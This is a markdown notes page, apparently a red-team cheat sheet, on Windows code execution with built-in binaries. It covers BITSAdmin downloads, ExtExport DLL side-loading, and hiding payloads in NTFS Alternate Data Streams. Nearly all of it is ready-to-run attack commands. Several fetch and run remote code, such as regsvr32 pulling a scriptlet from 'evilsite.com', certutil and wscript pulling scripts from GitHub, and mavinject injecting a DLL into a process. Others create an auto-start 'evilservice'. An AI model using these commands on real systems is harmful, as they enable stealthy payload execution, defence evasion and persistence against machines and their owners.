---
title: "Code Execution"
date: 2020-07-17T20:59:33+02:00
draft: false
---

#### LOLBAS (Living Off The Land Binaries and Scripts)
https://lolbas-project.github.io/


#### BITSAdmin
Mostly depricated, but still included in Winows. Many features of BITSAdmin. Originally 
Download a file:
```
$ bitsadmin /transfer <job_name> /priority <priority> <remote_path> <local_path>
```
```
$ bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```
Copy a file:
```
$ bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
```
Execute a file:
```
$ bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
```


#### ExtExport.exe
Bundles with Internet Explorer that can load DLL's named in one of the following names:
* mozcrt19.dll
* mozsqlite3.dll
* sqlite3.dll

An attacker can abuse this tool by passing it a path ("C:\test" in the below example) where a malicious DLL is stored.
```
$ Extexport.exe c:\test foo bar
```

ExtExport.exe will then side-load it and the embedded payload will be executed.


#### ADS (Alternate Data Streams)
An Alternate Data Stream is a little-known feature of the NTFS file system. It has the ability of forking data into an existing file without changing its file size or functionality.

Hiding files in ADS:
```
$ type <filepath> <target_file:ads>
```
Executing files from ADS:
```
$ <command> <target_file:ads> [arguments]
```
ADS can be used in a variaty of methods:

##### Add content to ADS
```
$ type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
$ extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
$ findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe > c:\ADS\file.txt:procexp.exe
$ certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
$ makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
$ print /D:c:\ads\file.txt:autoruns.exe c:\ads\Autoruns.exe
$ reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg
$ regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
$ expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
$ esentutl.exe /y C:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o
$ powershell -command " & {(Get-Content C:\ADS\file.exe -Raw | Set-Content C:\ADS\file.txt -Stream file.exe)}"
$ curl file://c:/temp/autoruns.exe --output c:\temp\textfile1.txt:auto.exe
$ cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://evilsite.com/RegSvr32.sct   ^scrobj.dll > fakefile.doc:reg32.bat
$ "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe" -DownloadFile -url https://www.7-zip.org/a/7z1900.exe -path c:\\temp\\1.txt:7-zip.exe
```

##### Extract content from ADS
```expand c:\ads\file.txt:test.exe c:\temp\evil.exe```
```esentutl.exe /Y C:\temp\file.txt:test.exe /d c:\temp\evil.exe /o```

##### Executing the ADS content

WMIC

```wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"' ```

Rundll32

```rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain```
```rundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll```
```rundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll```

Cscript

```cscript "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Script.vbs"```

Wscript

```wscript c:\ads\file.txt:script.vbs```
```echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js```

Forfiles

```forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\shellloader.dll:bginfo.exe"```

Mavinject.exe

```
c:\windows\SysWOW64\notepad.exe
tasklist | findstr notepad
notepad.exe                   4172 31C5CE94259D4006           2     18,476 K
type c:\temp\AtomicTest.dll > "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
c:\windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.16299.15_none_e07aa28c97ebfa48\mavinject.exe 4172 /INJECTRUNNING "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
```

MSHTA

```mshta "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"```
(Does not work on Windows 10 1903 and newer)

Control.exe

```control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll```

Create service and run

```
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice
```

Powershell.exe

```powershell -ep bypass - < c:\temp:ttt```
```powershell -command " & {(Get-Content C:\ADS\1.txt -Stream file.exe -Raw | Set-Content c:\ADS\file.exe) | start-process c:\ADS\file.exe}"```
```Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = C:\ads\folder:file.exe}```

Regedit.exe

```regedit c:\ads\file.txt:regfile.reg```

Bitsadmin.exe

```
bitsadmin /create myfile
bitsadmin /addfile myfile c:\windows\system32\notepad.exe c:\data\playfolder\notepad.exe
bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
bitsadmin /RESUME myfile
```

AppVLP.exe

```AppVLP.exe c:\windows\tracing\test.txt:ha.exe```

Cmd.exe

```cmd.exe - < fakefile.doc:reg32.bat```

Ftp.exe

```ftp -s:fakefile.txt:aaaa.txt```

ieframe.dll , shdocvw.dll (ads)

```
echo [internetshortcut] > fake.txt:test.txt && echo url=C:\windows\system32\calc.exe >> fake.txt:test.txt rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt
rundll32.exe shdocvw.dll,OpenURL C:\temp\ads\fake.txt:test.txt
```

bash.exe

```
echo calc > fakefile.txt:payload.sh && bash < fakefile.txt:payload.sh
bash.exe -c $(fakefile.txt:payload.sh)
```

Regsvr32

```
type c:\Windows\System32\scrobj.dll > Textfile.txt:LoveADS
regsvr32 /s /u /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Textfile.txt:LoveADS
```

##### Write registry
```regini.exe file.txt:hidden.ini```

#### References
https://labs.f-secure.com/blog/attack-detection-fundamentals-code-execution-and-persistence-lab-1
https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
